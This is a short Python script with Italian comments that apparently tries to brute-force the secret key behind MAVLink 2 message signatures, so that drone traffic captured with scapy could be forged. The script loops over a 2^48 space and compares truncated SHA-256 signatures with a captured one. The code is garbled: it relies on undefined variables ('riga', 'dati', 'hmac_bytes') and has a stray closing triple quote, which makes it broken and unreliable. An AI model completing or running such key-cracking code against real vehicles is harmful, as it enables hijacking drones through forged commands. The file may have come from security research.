from pymavlink import mavutil
from pymavlink.dialects.v20 import secure as mavlink2
from scapy.all import sniff
import hmac, hashlib, time, os
from crypto_utils import generate_ecdh_keypair, derive_shared_key, encrypt, decrypt

#Questa funzione è una funzione di prova che è stata definita per capire se i byte del fram MAVLink sono stati catturati e selezionati per bene. Inoltre permette di capire se l'hash è stato calcolato correttamente.
def HASH_calcolo(chiave, dati):
	msg_to_sign = chiave + dati
	digest = hashlib.sha256(msg_to_sign).digest()
	signature = digest[:6]
	return signature
	

secret_key = ''
#dati = header_bytes + payload_bytes + crc_bytes + link_id.to_bytes(1, "little") + timestamp.to_bytes(6, "little")


limite_superiore = 2**48
# Il numero di byte (48 bit / 8 = 6 byte)
NUM_BYTE = 6
for hash_value in range(limite_superiore):
        #print(hash_value)
        hash_bytes = hash_value.to_bytes(length=NUM_BYTE, byteorder='big', signed=False)
        hash_bytes_puliti = hash_bytes.lstrip(b'\x00')
        #print(hash_bytes)
        #print(hash_bytes_puliti)
        hash_calcolato = HASH_calcolo(riga.rstrip().encode('utf-8'), dati)
        if hmac_bytes == hash_calcolato:
            secret_key = riga.rstrip()
            print(f"\n\nCHIAVE DI FIRMA TROVATA. ESSA E' {secret_key}")
            break'''

if secret_key == '':      
    print(f"\n\nCHIAVE DI FIRMA NON TROVATA. Termino")
    exit()

KEY_SIGNA = secret_key


